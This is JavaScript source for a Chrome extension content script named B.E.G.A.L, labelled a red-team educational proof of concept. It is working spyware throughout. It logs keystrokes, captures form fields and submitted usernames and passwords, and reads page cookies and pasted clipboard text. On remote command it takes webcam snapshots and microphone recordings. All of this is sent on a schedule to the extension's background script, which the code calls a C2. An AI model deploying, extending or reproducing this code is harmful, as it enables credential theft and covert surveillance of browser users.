// =============================================
// B.E.G.A.L - JUST FOR EDUCATIONAL PURPOSE
// Red Team Education POC - With Start/Stop Feature
// =============================================

console.log("%c[B.E.G.A.L - v.3] Content Script Injected Successfully", "color: red; font-weight: bold; font-size: 13px");

let monitoringEnabled = true;
let keystrokes = "";

let autofillData = {
  url: location.href,
  hostname: location.hostname,
  platform: navigator.platform,
  userAgent: navigator.userAgent,
  timestamp: new Date().toISOString(),
  title: document.title,
  fields: [],
  cookies: document.cookie,
  keystrokes: ""
};

// Cek status monitoring
chrome.storage.local.get(['monitoringEnabled'], (result) => {
  if (result.monitoringEnabled === false) {
    monitoringEnabled = false;
    console.log("%c[B.E.G.A.L] Monitoring sudah dinonaktifkan", "color: gray");
  }
});

// Message Listener
chrome.runtime.onMessage.addListener((msg) => {
  if (msg.type === "STOP_MONITORING") {
    monitoringEnabled = false;
    console.log("%c[B.E.G.A.L] Monitoring dihentikan di halaman ini", "color: orange");
  }
  else if (msg.type === "START_MONITORING") {
    monitoringEnabled = true;
    console.log("%c[B.E.G.A.L] Monitoring diaktifkan kembali", "color: lime");
  }
  else if (msg.type === "TRIGGER_WEBCAM_CAPTURE") {
    handleWebcamCapture();
  }
  else if (msg.type === "RECORD_AUDIO") {
    handleAudioRecord(msg.duration);
  }
});

// ==================== REMOTE WEBCAM CAPTURE ====================
async function handleWebcamCapture() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    // Tunggu sebentar agar kamera fokus
    await new Promise(r => setTimeout(r, 1000));

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);

    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
    stream.getTracks().forEach(track => track.stop());

    // Kirim hasil capture sebagai data eksfiltrasi
    chrome.runtime.sendMessage({
      type: "SAVE_DATA",
      data: {
        type: "Webcam Capture",
        url: location.href,
        timestamp: new Date().toISOString(),
        imageData: dataUrl
      }
    });
    console.log("%c[B.E.G.A.L] Webcam capture successful and sent to C2", "color: lime");
  } catch (err) {
    console.error("[B.E.G.A.L] Webcam access error:", err);
  }
}

// ==================== REMOTE AUDIO RECORD ====================
async function handleAudioRecord(duration) {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    const mediaRecorder = new MediaRecorder(stream);
    const audioChunks = [];

    mediaRecorder.addEventListener("dataavailable", event => {
      audioChunks.push(event.data);
    });

    mediaRecorder.addEventListener("stop", async () => {
      const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
      const reader = new FileReader();
      reader.readAsDataURL(audioBlob);
      reader.onloadend = function() {
          const base64AudioMessage = reader.result;
          chrome.runtime.sendMessage({
              type: "SAVE_DATA",
              data: {
                  type: "Mic Capture",
                  url: location.href,
                  timestamp: new Date().toISOString(),
                  audioData: base64AudioMessage
              }
          });
      }
      stream.getTracks().forEach(track => track.stop());
    });

    mediaRecorder.start();
    setTimeout(() => {
      mediaRecorder.stop();
    }, duration);
    console.log("%c[B.E.G.A.L] Audio record started", "color: lime");
  } catch (err) {
    console.error("[B.E.G.A.L] Audio access error:", err);
  }
}

// ==================== KEYLOGGER ====================
document.addEventListener('keydown', (e) => {
  if (!monitoringEnabled) return;
  
  if (e.key.length === 1) {
    keystrokes += e.key;
  }
  if (e.key === "Enter" || keystrokes.length > 100) {
    sendDataToBackground();
    keystrokes = "";
  }
});

// ==================== INPUT MONITORING ====================
document.addEventListener('input', (e) => {
  if (!monitoringEnabled) return;
  
  const target = e.target;
  if (!target || !['INPUT', 'TEXTAREA', 'SELECT'].includes(target.tagName)) return;

  const fieldData = {
    field: target.name || target.id || target.placeholder || "unknown",
    value: target.value,
    type: target.type || "text"
  };

  const existingIndex = autofillData.fields.findIndex(f => f.field === fieldData.field);
  if (existingIndex !== -1) {
    autofillData.fields[existingIndex] = fieldData;
  } else {
    autofillData.fields.push(fieldData);
  }
});

// ==================== FORM SUBMIT (CREDENTIAL VAULT) ====================
document.addEventListener('submit', (e) => {
  if (!monitoringEnabled) return;
  console.log("%c[B.E.G.A.L] Form Submit Detected", "color: orange");
  
  let username = "";
  let password = "";
  autofillData.fields.forEach(f => {
      if (f.type === 'password') password = f.value;
      else if (f.field.toLowerCase().includes('user') || f.field.toLowerCase().includes('email')) username = f.value;
  });

  const submitData = {
      ...autofillData,
      type: "LOGIN_DATA",
      creds: { username, password }
  };
  chrome.runtime.sendMessage({
      type: "SAVE_DATA",
      data: submitData
  });
}, true);

// ==================== CLIPBOARD HIJACK ====================
document.addEventListener('paste', (e) => {
  if (!monitoringEnabled) return;

  const pastedData = (e.clipboardData || window.clipboardData).getData('text');
  
  if (pastedData) {
    console.log("%c[B.E.G.A.L] Clipboard data captured!", "color: orange");
    
    const clipboardPayload = {
        ...autofillData,
        type: "Clipboard Hijack",
        pastedContent: pastedData,
        timestamp: new Date().toISOString(),
        fields: []
    };

    chrome.runtime.sendMessage({
        type: "SAVE_DATA",
        data: clipboardPayload
    });
  }
});

// ==================== SEND DATA ====================
function sendDataToBackground() {
  if (!monitoringEnabled || (autofillData.fields.length === 0 && keystrokes.length === 0)) return;

  autofillData.keystrokes = keystrokes;
  autofillData.timestamp = new Date().toISOString();

  chrome.runtime.sendMessage({
    type: "SAVE_DATA",
    data: autofillData
  });
}

// Auto send
setTimeout(() => {
  if (monitoringEnabled) sendDataToBackground();
}, 4000);

setInterval(() => {
  if (monitoringEnabled) sendDataToBackground();
}, 20000);

window.addEventListener('beforeunload', () => {
  if (monitoringEnabled) sendDataToBackground();
});

// ==================== SERVICE WORKER KEEP-ALIVE ====================
// Menjaga agar background.js tidak dimatikan (sleep) oleh Chrome Manifest V3
// terutama saat bot berstatus 'stop' dan tidak ada aktivitas pengiriman data
setInterval(() => {
  chrome.runtime.sendMessage({ type: "HEARTBEAT" }).catch(() => {});
}, 10000);